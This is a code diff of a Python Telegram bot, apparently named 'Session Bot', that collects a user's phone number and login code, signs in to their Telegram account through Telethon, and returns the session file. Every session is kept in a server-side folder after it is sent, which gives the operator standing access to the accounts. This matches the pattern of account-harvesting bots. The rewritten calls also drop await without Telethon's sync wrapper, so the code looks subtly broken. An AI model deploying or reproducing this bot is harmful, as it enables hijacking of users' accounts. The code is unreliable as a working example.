@@ -1,9 +1,9 @@
 import os
-import zipfile
 import telebot
 from telebot import types
 from telethon import TelegramClient
-import asyncio
+from telethon.errors import FloodWaitError
+import time
 
 TOKEN = os.getenv('TOKEN')
 API_ID = int(os.getenv('API_ID', '28537210'))
@@ -14,18 +14,13 @@ os.makedirs('sessions', exist_ok=True)
 
 user_data = {}
 
-# ========== ОСНОВНОЙ ЦИКЛ ==========
-loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
-
-# ========== КОМАНДЫ ==========
 @bot.message_handler(commands=['start'])
 def start(m):
     uid = m.chat.id
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
     markup.add(btn)
-    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер телефона", reply_markup=markup)
+    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер", reply_markup=markup)
 
 @bot.message_handler(content_types=['contact'])
 def handle_contact(m):
@@ -41,19 +36,24 @@ def handle_contact(m):
     user_data[uid] = {'phone': phone}
     bot.send_message(uid, f"📲 Номер: {phone}\nОтправляю код...")
     
-    async def send_code():
-        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
-        user_data[uid]['client'] = client
-        await client.connect()
-        try:
-            await client.send_code_request(phone)
-            bot.send_message(uid, "✅ Код отправлен! Введите его цифрами:")
-            bot.register_next_step_handler(m, get_code)
-        except Exception as e:
-            bot.send_message(uid, f"❌ Ошибка: {e}")
-            await client.disconnect()
+    # Создаём клиент синхронно
+    client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
+    user_data[uid]['client'] = client
     
-    loop.create_task(send_code())
+    # Подключаемся и отправляем код
+    client.connect()
+    try:
+        client.send_code_request(phone)
+        bot.send_message(uid, "✅ Код отправлен! Введите его:")
+        bot.register_next_step_handler(m, get_code)
+    except FloodWaitError as e:
+        bot.send_message(uid, f"❌ FloodWait: жди {e.seconds} секунд")
+        client.disconnect()
+        del user_data[uid]
+    except Exception as e:
+        bot.send_message(uid, f"❌ Ошибка: {e}")
+        client.disconnect()
+        del user_data[uid]
 
 def get_code(m):
     uid = m.chat.id
@@ -66,47 +66,33 @@ def get_code(m):
     client = user_data[uid]['client']
     phone = user_data[uid]['phone']
     
-    async def login():
-        try:
-            await client.sign_in(phone, code)
-            await client.disconnect()
-            
-            session_file = f'sessions/user_{uid}.session'
-            if os.path.exists(session_file):
-                zip_path = f'/tmp/session_{uid}.zip'
-                with zipfile.ZipFile(zip_path, 'w') as zf:
-                    zf.write(session_file, arcname=f'session_{uid}.session')
-                with open(zip_path, 'rb') as f:
-                    bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
-                os.remove(zip_path)
-            else:
-                bot.send_message(uid, "❌ Файл сессии не найден")
-            
-            del user_data[uid]
-            
-        except Exception as e:
-            bot.send_message(uid, f"❌ Ошибка: {e}")
-            await client.disconnect()
-            del user_data[uid]
-    
-    loop.create_task(login())
+    try:
+        client.sign_in(phone, code)
+        client.disconnect()
+        
+        session_file = f'sessions/user_{uid}.session'
+        if os.path.exists(session_file):
+            with open(session_file, 'rb') as f:
+                bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
+        else:
+            bot.send_message(uid, "❌ Файл сессии не найден")
+        
+        del user_data[uid]
+        
+    except Exception as e:
+        bot.send_message(uid, f"❌ Ошибка: {e}")
+        client.disconnect()
+        del user_data[uid]
 
 @bot.message_handler(commands=['cancel'])
 def cancel(m):
     uid = m.chat.id
     if uid in user_data and 'client' in user_data[uid]:
-        async def close():
-            await user_data[uid]['client'].disconnect()
-        loop.create_task(close())
+        user_data[uid]['client'].disconnect()
         del user_data[uid]
     
     markup = types.ReplyKeyboardRemove()
     bot.send_message(uid, "❌ Отменено", reply_markup=markup)
 
-# ========== ЗАПУСК ==========
-def run_bot():
-    print("🚀 Session Bot запущен")
-    bot.infinity_polling()
-
-if __name__ == '__main__':
-    run_bot()
+print("🚀 Session Bot запущен")
+bot.infinity_polling()
